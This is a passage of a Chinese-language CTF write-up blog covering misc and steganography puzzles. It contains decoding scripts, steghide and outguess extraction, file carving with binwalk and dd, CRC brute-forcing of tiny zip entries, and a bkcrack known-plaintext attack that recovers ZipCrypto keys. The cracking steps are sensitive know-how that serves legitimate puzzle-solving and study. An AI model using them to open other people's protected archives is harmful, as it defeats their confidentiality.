class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;1.txt&#x27;</span>)</span><br><span class="line">result = []</span><br><span class="line">result.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number))</span><br><span class="line">result = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">strings =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = bytearray.fromhex(i)</span><br><span class="line">    z = str(y)</span><br><span class="line">    z= re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,z)[<span class="number">0</span>]</span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b= strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> len(i) ==<span class="number">1</span>:</span><br><span class="line">        i= <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    strings +=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到压缩包的十六进制，使用winhex制作压缩包。打开之后发现有密码。然后用给的图片放入winhex中发现有一串十六进制，解密拿到压缩包密码。解压之后发现是以<code>tESkpFRktQSjVIVTZUMlBJPQ==</code>结尾，尝试十六进制解密。解密之后还是base64，猜测是循环加密。</p><p>这里使用脚本解密</p><p>base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">url = read_file(<span class="string">&#x27;test11.txt&#x27;</span>)</span><br><span class="line">url = re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,url)[<span class="number">0</span>]</span><br><span class="line">url = base64.b64decode(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;test12.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(url))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>base32</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    <span class="keyword">with</span> open(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">url = read_file(<span class="string">&#x27;test15.txt&#x27;</span>)</span><br><span class="line">url = re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,url)[<span class="number">0</span>]</span><br><span class="line">url = base64.b32decode(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;test16.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(str(url))</span><br></pre></td></tr></table></figure><p>一共进行了十六次解密。解密之后是一串<code> fuck/Ook!</code>。在线网站解密。拿到flag。</p><h3 id="misc21"><a href="#misc21" class="headerlink" title="misc21"></a>misc21</h3><p>outguess解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k 123456 -r 4.jpg hidden.txt</span><br></pre></td></tr></table></figure><p>压缩包放到winhex中发现尾部，有09 0A 0D 20 这些交替出现。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/7.jpg" alt="7"></p><p>放到notepad++中，直接十六进制转换ascii。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">09→ tab符</span><br><span class="line">20→空格</span><br><span class="line">0A→\r</span><br><span class="line">0D→\n</span><br></pre></td></tr></table></figure><p>然后放到sublim中替换为莫斯密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tab 替换 -</span><br><span class="line">空格 替换 .</span><br><span class="line">tab 替换&#x2F;</span><br><span class="line">\n 替换&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/8.png" alt="8"></p><p>解密得到flag。</p><h3 id="setg10"><a href="#setg10" class="headerlink" title="setg10"></a>setg10</h3><p>拿到一张图片，放入winhex中发现，一串类似于base64的值，但是字符串最后有两个点，两个点替换为==。base64解码。</p><h3 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h3><p><code>https://www.lanzous.com/i9b0ksd</code></p><p>下载之后拿到一个压缩包，压缩包中有一个文件名字为密码，打开之后有十个txt文件，名字也为密码，而且文件大小很少，尝试爆破crc把这几个文件的内容组成压缩包密码。</p><p>这里文件大小为1字节，所以尝试一下一位crc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">dic&#x3D;string.printable</span><br><span class="line">#输入密码文件的CRC码</span><br><span class="line">crcl&#x3D;[0xF3B61B38,0xF3B61B38,0X6ABF4A82,0X5ED1937E,0X09b9265b,0x84b12bae,0x70659eff,0x90b077e1,0x6abf4a82]</span><br><span class="line">key &#x3D; &#39;&#39;</span><br><span class="line">for crc in crcl:</span><br><span class="line">    for i in dic:</span><br><span class="line">        if crc&#x3D;&#x3D;(binascii.crc32(i)&amp;0xffffffff):</span><br><span class="line">            key &#x3D;key + i</span><br><span class="line">            print key</span><br></pre></td></tr></table></figure><h3 id="红包第五题"><a href="#红包第五题" class="headerlink" title="红包第五题"></a>红包第五题</h3><p>打开压缩包里面有一个mp3，然后把压缩包放入01eidoter中发现，提示载入错误，说明还有别的文件，然后发现压缩包尾部有jpg的文件尾部，直接提取出jpg。</p><p>jpg头部<code>FFD8FFE0</code></p><p>jpg尾部<code>8A0FFD9</code></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/15.png" alt="15"></p><p>提取出jpg使用steghide工具，提取文本，在该工具目录下发现flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\图片隐写\steghide&gt;steghide.exe extract -sf C:\Users\12521\Desktop\1.jpg</span><br><span class="line">Enter passphrase:</span><br><span class="line">wrote extracted data to &quot;flag.txt&quot;.</span><br></pre></td></tr></table></figure><p>其中有一串密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aHR0cHM6Ly93d3cubGFuem91cy5jb20vaTlkcGp4ZQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>解密拿到一个网址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.lanzous.com&#x2F;i9dpjxe</span><br></pre></td></tr></table></figure><p>拿到一个压缩包，打开里面的txt是许多数字。但是没有大于F的所以直接<code>16进制→10进制→ascii码</code>。两个一组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steady_str=open(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">2</span>):</span><br><span class="line">    flag+=chr(int(steady_str[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>转换之后拿到一个坐标。使用正则表达式提取坐标。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">&#x27;tupian.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">steady_key=re.findall(<span class="string">&#x27;\((.*?)\)&#x27;</span>,f)</span><br><span class="line">print(steady_key)</span><br></pre></td></tr></table></figure><p>将坐标写入文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady_flag=open(<span class="string">&#x27;steady_flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_key:</span><br><span class="line">    steady_flag.write(i+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>查看坐标的数量，进行分解，求得长和宽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">5328</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line"><span class="keyword">if</span> (i*j)==a:</span><br><span class="line">print(i,j)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">36</span>, <span class="number">148</span>)</span><br><span class="line">(<span class="number">37</span>, <span class="number">144</span>)</span><br><span class="line">(<span class="number">48</span>, <span class="number">111</span>)</span><br><span class="line">(<span class="number">72</span>, <span class="number">74</span>)</span><br><span class="line">(<span class="number">74</span>, <span class="number">72</span>)</span><br><span class="line">(<span class="number">111</span>, <span class="number">48</span>)</span><br><span class="line">(<span class="number">144</span>, <span class="number">37</span>)</span><br></pre></td></tr></table></figure><p>RDB画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">x = <span class="number">72</span> <span class="comment">#x坐标  通过对txt里的行数进行整数分解</span></span><br><span class="line">y = <span class="number">74</span> <span class="comment">#y坐标  x*y = 行数</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>,(x,y))<span class="comment">#创建图片</span></span><br><span class="line">file = open(<span class="string">&#x27;rgb2.txt&#x27;</span>) <span class="comment">#打开rbg值文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过一个个rgb点生成图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,y):</span><br><span class="line">        line = file.readline()<span class="comment">#获取一行</span></span><br><span class="line">       <span class="comment"># line = line.replace(&#x27;\n&#x27;,&#x27;&#x27;)</span></span><br><span class="line">        print(line)</span><br><span class="line">        rgb = line.split(<span class="string">&quot;,&quot;</span>)<span class="comment">#分离rgb</span></span><br><span class="line">        print(rgb)</span><br><span class="line">        im.putpixel((i,j),(int(rgb[<span class="number">0</span>]),int(rgb[<span class="number">1</span>]),int(rgb[<span class="number">2</span>])))<span class="comment">#rgb转化为像素</span></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;1.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫码拿到flag。</p><h3 id="红包第八题"><a href="#红包第八题" class="headerlink" title="红包第八题"></a>红包第八题</h3><p>大致原理就是一个mp4文件，读取之后转十六进制，然后每个十六进制反序。得到一个新的mp4文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;NBA.mp4&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">print</span> hex(ord(i))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data=f.readlines()</span><br><span class="line">d=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    result=i.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(result)!=<span class="number">2</span>:</span><br><span class="line">        d+=chr(int(<span class="string">&#x27;0x&#x27;</span>+result+<span class="string">&#x27;0&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d+=chr(int(<span class="string">&#x27;0x&#x27;</span>+result[::<span class="number">-1</span>],<span class="number">16</span>))</span><br><span class="line"><span class="keyword">print</span> d</span><br></pre></td></tr></table></figure><h3 id="Triglavian"><a href="#Triglavian" class="headerlink" title="Triglavian"></a>Triglavian</h3><p>拿到一个压缩包需要密码。要么爆破，要么伪加密，要么明文攻击。前两者都不是但是又只有一个文件，不符合明文攻击，这里我们需要创建一个文件。因为压缩包里就一张<code>Triglavian.png</code>图片，而png图片的开头有16字节是不变的，为<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code>。<br>这里我们需要自己创建一个<code>png_header.png</code>文件，内容就是由那16字节组成。</p><p>使用工具开始攻击–<code>rbkcrack.exe</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; rbkcrack.exe -C Triglavian.zip -c Triglavian.png -p PNG_header.png</span><br><span class="line"></span><br><span class="line">-C 要攻击的压缩包</span><br><span class="line">-c 要攻击的压缩包里面的文件</span><br><span class="line">-p 刚创建的明文文件名</span><br></pre></td></tr></table></figure><p>能破解得到ZipCrypto的内部的三个key：<code>be056038 0a143c0c 1ea08ca5</code>。</p><p>用这三个key来解码文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; rbkcrack.exe -C Triglavian.zip -c Triglavian.png -k be056038 0a143c0c 1ea08ca5 -d Triglavian.png</span><br><span class="line"></span><br><span class="line">-C 要攻击的压缩包</span><br><span class="line">-c 要攻击的压缩包里面的文件</span><br><span class="line">-k 刚生成的三个key</span><br><span class="line">-d 最终还原的文件名</span><br></pre></td></tr></table></figure><p>最终在同路径下得到压缩的文件。</p><h1 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h1><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h3><p>打开之后是一个压缩包，使用winrar打开提示文件头部错误，压缩包中的文件可以正常打开，打开之后提示flag is not here，仔细看提示发现还有一个secrect.png文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/16.png" alt="16"></p><p>这里就需要分析一下rar的结构，拖入01editor。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/17.png" alt="17"></p><p>发现png的文件头出了问题。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/18.png" alt="18"></p><p>现png那的文件头类型A8 3C 7A，把7A修改为74。最后发现修改成功。</p><p>得到secret.png，查看一张纯白的图片，用010Editor查看是一个gif的文件。放入stegsolve。发现一半二维码。</p><p>最后使用PS来进行修改。拿到flag。</p><h3 id="好多压缩包"><a href="#好多压缩包" class="headerlink" title="好多压缩包"></a>好多压缩包</h3><p>crc校验码来爆破出内部文件的内容，拿到一串base64</p><p><code>+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</code></p><p>解码之后有乱码，说明解码之后应该是一个文件，尝试python解码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f=<span class="string">&#x27;z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==&#x27;</span></span><br><span class="line">f=open(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(base64.b64decode(f))</span><br></pre></td></tr></table></figure><p>解码之后的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">蠍s  </span><br><span class="line">       ?z €# I   T   ?kcI3    CMT溯AO?H予彉EQAF鳠 B|m+竔薀(,3(麳??,Fv崤韌Mr轒J諅t緬?</span><br><span class="line">斖井?&quot;€J鱰 ?       b宴誒cI0     flag.txt ?iffix the file and get the flag?&#123; @ </span><br></pre></td></tr></table></figure><p>提示修复，直接访问winhex修复，查看文件尾部<code>C43D7B00400700</code>，网上wp说这是文件尾部，但是我查看了好多rar包尾部都不是<code>C43D7B00400700</code>。这里直接修补上头部。<code>526172211A0700</code>。</p><p>修复之后，在压缩包注释中有flag。这里要注意如果压缩包中有注释的话，压缩包的十六进制中会有CMT字段。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/19.png" alt="19"></p><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><p>一串二进制，直接转换成十六进制，然后发现是十六进制是rar的文件，直接转换成rar。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">beginnum = <span class="number">0</span></span><br><span class="line">endnum = <span class="number">4</span></span><br><span class="line">b = []</span><br><span class="line">f = open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">4</span>):</span><br><span class="line">    b.append(hex(int(a[i:i+<span class="number">4</span>], <span class="number">2</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    i = i[<span class="number">2</span>:]</span><br><span class="line">    print(i)</span><br><span class="line">    f.write(i)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>这里是四个一组转化成十六进制，也可以八个一组转化成十六进制，但是涉及到0的问题，十六进制一般为两个数字，如果不足我们需要补0，所以我们最好是四个一组转换。</p><p>base64解码得到flag。</p><h3 id="红绿灯"><a href="#红绿灯" class="headerlink" title="红绿灯"></a>红绿灯</h3><p>首先使用画图工具随便定位一个像素，如果为绿色则+1，红色+0。使用如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> </span><br><span class="line">savepath=<span class="string">&#x27;C:/Users/12521/flag/&#x27;</span></span><br><span class="line">im=Image.open(<span class="string">&#x27;C:/Users/12521/1.gif&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  im.save(savepath+<span class="string">&#x27;light&#123;0&#125;.png&#x27;</span>.format(im.tell()))</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    im.seek(im.tell()+<span class="number">1</span>)</span><br><span class="line">    im.save(savepath+<span class="string">&#x27;light&#123;0&#125;.png&#x27;</span>.format(im.tell()))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1168</span>):</span><br><span class="line">  image=Image.open(savepath+<span class="string">&#x27;light&#x27;</span>+str(i)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> image.getpixel((<span class="number">115</span>,<span class="number">55</span>))==<span class="number">251</span>:</span><br><span class="line">    flag+=str(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">elif</span> image.getpixel((<span class="number">115</span>,<span class="number">145</span>))==<span class="number">186</span>:</span><br><span class="line">    flag+=str(<span class="number">0</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>最后二进制转flag。</p><h3 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h3><p>一张图片，使用binwalk分析一下，有一个压缩包，尝试foremost或者dd命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ binwalk  /home/steady/桌面/steady/<span class="number">1.j</span>pg</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0</span>             <span class="number">0x0</span>             JPEG image data, EXIF standard</span><br><span class="line"><span class="number">12</span>            <span class="number">0xC</span>             TIFF image data, big-endian, offset of first image directory: <span class="number">8</span></span><br><span class="line"><span class="number">5005118</span>       <span class="number">0x4C5F3E</span>        PARity archive data</span><br><span class="line"><span class="number">6391983</span>       <span class="number">0x6188AF</span>        RAR archive data, version <span class="number">4.</span>x, first volume type: MAIN_HEAD</span><br></pre></td></tr></table></figure><p>DD命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ dd <span class="keyword">if</span>=<span class="number">1.j</span>pg of=flag.rar skip=<span class="number">6391983</span> bs=<span class="number">1</span></span><br><span class="line">记录了<span class="number">16301</span>+<span class="number">0</span> 的读入</span><br><span class="line">记录了<span class="number">16301</span>+<span class="number">0</span> 的写出</span><br><span class="line"><span class="number">16301</span> bytes (<span class="number">16</span> kB, <span class="number">16</span> KiB) copied, <span class="number">0.0386141</span> s, <span class="number">422</span> kB/s</span><br></pre></td></tr></table></figure><p>分离出一个压缩包但是需要密码。回到大象的图片，查看图片描述信息，发现在备注中有base64解密就是密码，修改压缩包中的图片的高度。拿到flag。</p><h3 id="图穷匕见"><a href="#图穷匕见" class="headerlink" title="图穷匕见"></a>图穷匕见</h3><p>打开一张图片，方式winhex查看，发现图片后面有许多数字。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/20.png" alt="20"></p><p>将十六进制放到winhex转换ascii、或者直接使用01editor，文件-&gt;导入十六进制，直接就被转换成了坐标。使用python脚本或者kali gnuplot工具也可以。</p><p>也可以使用python脚本转换十六进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print(len(f))</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(f),<span class="number">2</span>):</span><br><span class="line">    flag+=chr(int(f[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>坐标生成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="keyword">as</span> mpl</span><br><span class="line"> 